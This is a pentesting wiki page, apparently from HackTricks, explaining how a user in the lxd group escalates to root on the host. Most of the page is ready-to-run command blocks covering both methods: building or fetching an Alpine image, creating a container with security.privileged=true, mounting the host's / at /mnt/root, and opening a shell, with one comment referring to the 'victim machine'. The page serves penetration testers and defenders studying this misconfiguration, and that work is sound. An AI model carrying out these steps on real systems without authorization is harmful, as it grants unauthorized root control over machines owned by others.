# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Membership in the host's LXD management group (normally _**lxd**_) can provide a path to root by allowing full control of the daemon.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Method 1

You can download an Alpine image to use with LXD from a trusted repository.
Canonical's LXD image server publishes daily builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Just grab both **lxd.tar.xz** and **rootfs.squashfs** from the newest build (the directory name is the date).<sup>[[8]](#references)</sup>

Alternatively, you can install distrobuilder on your machine by following the [project instructions](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Upload **incus.tar.xz** (**lxd.tar.xz** if you downloaded from the Canonical image server) and **rootfs.squashfs**, then import the image and create a container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
> Run **`lxd init`**, set up a default storage pool, then **repeat** the previous chunk of commands.<sup>[[2]](#references)</sup>

Finally, start the container and open a root shell on the host filesystem:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

### Method 2

Build an Alpine image and start it with the flag `security.privileged=true`, which maps container root to host root; mounting `/` then exposes the host filesystem inside the container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## References

- [1] [How to harden security for LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers and virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [How to copy and import images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [How to build images with distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)

{{#include ../../../banners/hacktricks-training.md}}
